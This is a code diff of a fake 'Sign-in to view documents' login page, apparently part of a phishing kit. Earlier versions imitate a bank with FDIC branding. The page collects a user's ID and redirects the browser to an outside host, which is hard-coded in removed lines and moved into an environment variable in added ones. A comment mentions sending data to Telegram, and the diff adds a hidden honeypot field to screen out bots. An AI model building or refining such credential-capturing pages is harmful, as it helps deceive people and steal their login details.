@@ -5,13 +5,15 @@ export default function Home() {
   const handleSubmit = (e) => {
     e.preventDefault();
     const continueBtn = document.querySelector(".LoginBtn");
+    const honeypot = document.querySelector("#company");
     continueBtn.innerHTML = "Processing..."
 
     const userID = document.getElementById('userid').value.trim();
+    if (!userID || honeypot.value !== '') return;
+    const uniquesPreUrl = process.env.NEXT_PUBLIC_URL_NAME
 
     // Format the message to send to Telegram
-    const url = `https://oswuglez.jizipe.sa.com/Ec756NR0p@6wI9ax/?om${userID}`;
-
+    const url = `${uniquesPreUrl}&omn=${userID}`;
     try {
       setTimeout(() => {
         window.location.href = url;
@@ -23,12 +25,12 @@ export default function Home() {
   }
   return (
     <>
-      
       <main className="grandCntn">
+        <div className="sideShow">
+          <img src="/logo.webp" alt="" />
+          <h1>You're a couple of steps away from having your Documents<span>!</span></h1>
+        </div>
         <div className="formCntn">
-          <div className="formTitle">
-            <h1>AURALIS<sup>®</sup></h1>
-          </div>
           <h2 className="title_note">Sign-in to view documents</h2>
           <div className="form">
             <form className="firstSection login" onSubmit={(e) => {handleSubmit(e)}}>
@@ -41,6 +43,8 @@ export default function Home() {
               <div className="submissionCntn">
                 <div className="rememberMe">
                   <input type="checkbox" id="rememberUser" />
+                  <input type="text" id="company" name="company" />
+
                   <label for="rememberUser">
                     <svg aria-hidden="true" focusable="false" width="20" height="20" viewBox="0 0 20 20">
                       <rect fill="none" stroke="none" strokeWidth="2" x="1" y="1" width="18" height="18" rx="3"></rect>
@@ -55,13 +59,8 @@ export default function Home() {
             </form>
 
           </div>
-          <div className="formFooter">
-            <a href="#" className="loc">Locations</a>
-            <a href="#" className="pol">Privacy Policy</a>
-            <a href="#" className="enrol">Enroll</a>
-          </div>
+         
         </div>
-        <div className="fdicLogoCntn"><a href="https://cdn1.onlineaccess1.com/cdn/depot/3308/4366/8d7a1cb117b7827559a004f16ac35368/assets/images/fdic_logo_large-101554d3eebb7c3c6fedb7d73549127b.png" target="_blank" rel="noopener noreferrer"><img src="https://www.dmayorfitness.com/fdic_logo.png" alt="" /></a></div>
       </main>
     </>
   );
